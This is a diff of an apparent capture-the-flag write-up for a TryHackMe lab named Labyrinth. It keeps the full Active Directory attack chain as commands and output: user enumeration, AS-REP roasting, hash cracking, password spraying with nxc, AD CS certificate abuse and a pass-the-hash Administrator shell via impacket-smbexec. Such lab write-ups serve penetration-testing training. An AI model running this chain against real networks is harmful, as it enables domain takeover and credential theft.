@@ -92,7 +92,7 @@ ff02::2 ip6-allrouterso
 Let's see if we have guest/anonymous logon allowed in smb shares.
 
 ```bash
-kali@kali:smbclient -L \\10.49.171.219                                                                                                                             
+kali@kali:smbclient -L \\10.49.171.219
 Password for [WORKGROUP\kali]:
 
         Sharename       Type      Comment
@@ -100,14 +100,14 @@ Password for [WORKGROUP\kali]:
         ADMIN$          Disk      Remote Admin
         C$              Disk      Default share
         IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        SYSVOL          Disk      Logon server share 
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.49.171.219 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-Since, we have guest logon allowed, let's brute force the usernames.
+Nothing that can help us here. Since, we have guest logon allowed, let's brute force the usernames.
 
 ```bash
 kali@kali:impacket-lookupsid labyrinth.thm.local/guest@10.49.171.219
@@ -148,28 +148,24 @@ Password:
 We have lot's of usernames, let's try AS-REP roasting to see if we can get some hashes from this long list of users.
 
 ```bash
-kali@kali:impacket-GetNPUsers thm.local/ -usersfile users.txt -format hashcat -dc-ip 10.49.171.219 -no-pass | grep '$krb5asrep'                              
+kali@kali:impacket-GetNPUsers thm.local/ -usersfile users.txt -format hashcat -dc-ip 10.49.171.219 -no-pass | grep '$krb5asrep'
 $krb5asrep$23$SHELLEY_BEARD@THM.LOCAL:9a461e935.....9d70364
-
 $krb5asrep$23$ISIAH_WALKER@THM.LOCAL:d5707d8.....a667367a
-
 $krb5asrep$23$QUEEN_GARNER@THM.LOCAL:a5744ed562.....50ed43d5
-
 $krb5asrep$23$PHYLLIS_MCCOY@THM.LOCAL:b66901.....558f9456
-
 $krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:b0008a.....460ff80f
 ```
 
 We get hashes for 5 users. Let's crack them using john the ripper.
 
 ```bash
-kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                   
+kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 5 password hashes with 5 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:00:49 DONE (2026-02-23 13:42) 0g/s 287162p/s 1435Kc/s 1435KC/s  0841079575..*7¡Vamos!
-Session completed. 
+Session completed.
 ```
 
 That was unsuccessful. It seems we fell into the rabbit hole. Let's move towards enumerating LDAP.
@@ -191,9 +187,9 @@ SUSANNA_MCKNIGHT:CH...3!
 ```
 
 ```bash
-kali@kali:nxc rdp 10.49.171.219 -u 'IVY_WILLIS' 'SUSANNA_MCKNIGHT' -p 'CH...3!' -d thm.local                                                                 
+kali@kali:nxc rdp 10.49.171.219 -u 'IVY_WILLIS' 'SUSANNA_MCKNIGHT' -p 'CH...3!' -d thm.local
 RDP         10.49.171.219   3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
-RDP         10.49.171.219   3389   LABYRINTH        [+] thm.local\IVY_WILLIS:CH...3! 
+RDP         10.49.171.219   3389   LABYRINTH        [+] thm.local\IVY_WILLIS:CH...3!
 RDP         10.49.171.219   3389   LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CH...3! (Pwn3d!)
 ```
 
@@ -211,7 +207,7 @@ kali@kali:xfreerdp3 /u:SUSANNA_MCKNIGHT /p:'CH...3!' /v:10.49.171.219 /d:thm.loc
 We get our first flag. Since, we have valid credentials, let's run bloodhound to see if we can map attack path.
 
 ```bash
-kali@kali:bloodhound-python -u 'SUSANNA_MCKNIGHT' -p 'CH...3!' -d 'thm.local' -dc 'LABYRINTH.thm.local' -ns 10.49.171.219 -c All                      
+kali@kali:bloodhound-python -u 'SUSANNA_MCKNIGHT' -p 'CH...3!' -d 'thm.local' -dc 'LABYRINTH.thm.local' -ns 10.49.171.219 -c All
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: thm.local
 INFO: Getting TGT for user
@@ -236,9 +232,9 @@ Loading in the bloodhoud UI, we see no possible attack paths from this user. Let
 Since, we saw a certificate during our nmap scan, and it also has port 80/443 open. Many AD CS setups have a web portal for users to request certificates. Let's verify
 
 ```bash
-kali@kali:nxc ldap 10.49.171.219 -u 'SUSANNA_MCKNIGHT' -p 'CH...3!' -M adcs                                                                                  
-LDAP        10.49.171.219   389    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local) (signing:None) (channel binding:Never)                                                                                                                                                   
-LDAP        10.49.171.219   389    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CH...3! 
+kali@kali:nxc ldap 10.49.171.219 -u 'SUSANNA_MCKNIGHT' -p 'CH...3!' -M adcs
+LDAP        10.49.171.219   389    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local) (signing:None) (channel binding:Never)
+LDAP        10.49.171.219   389    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CH...3!
 ADCS        10.49.171.219   389    LABYRINTH        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
 ADCS        10.49.171.219   389    LABYRINTH        Found PKI Enrollment Server: labyrinth.thm.local
 ADCS        10.49.171.219   389    LABYRINTH        Found CN: thm-LABYRINTH-CA
@@ -431,8 +427,8 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 That was successfull. While running certipy-ad, timeout might occur. Just run again. It should be successful. We have everything we need, let's login as Administrator.
 
 ```bash
-kali@kali:impacket-smbexec -k -hashes :07.....22 thm.local/Administrator@labyrinth.thm.local                                                
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-smbexec -k -hashes :07.....22 thm.local/Administrator@labyrinth.thm.local
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [-] CCache file is not found. Skipping...
 [!] Launching semi-interactive shell - Careful what you execute
